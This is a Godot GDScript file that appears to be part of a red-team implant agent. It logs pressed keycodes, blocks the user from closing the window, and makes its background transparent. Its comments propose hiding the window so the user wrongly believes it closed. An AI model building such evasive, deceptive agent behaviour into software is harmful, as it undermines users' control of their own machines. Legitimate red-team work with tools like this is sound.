extends Node

var transport = null
var has_sent_checkin = false
var time = 0
var time_period = 1
var do_exit = false
var exiting = false
var outbound = []
var headers
var connect_attempt

func _unhandled_input(event):
	if event is InputEventKey:
		if event.pressed:
			print(event.keycode)

func _notification(what):
	if what == Window.NOTIFICATION_WM_CLOSE_REQUEST:
		pass
		# Send notification to redteam that the user is trying to close the agent?
		# Send window to background so they think they were successful, set timer, pop-up again in a little bit?

func _ready():
	get_tree().set_auto_accept_quit(false) # Don't let users click X or alt+F4
	get_tree().get_root().set_transparent_background(true) # transparent background?

func _on_tasking_exit(transport, task):
	await get_tree().create_timer($".".get_node("transport/CallbackTimer").wait_time*2).timeout

	# inherited by children
	set_process(false)

	get_tree().quit()

	OS.kill(OS.get_process_id())
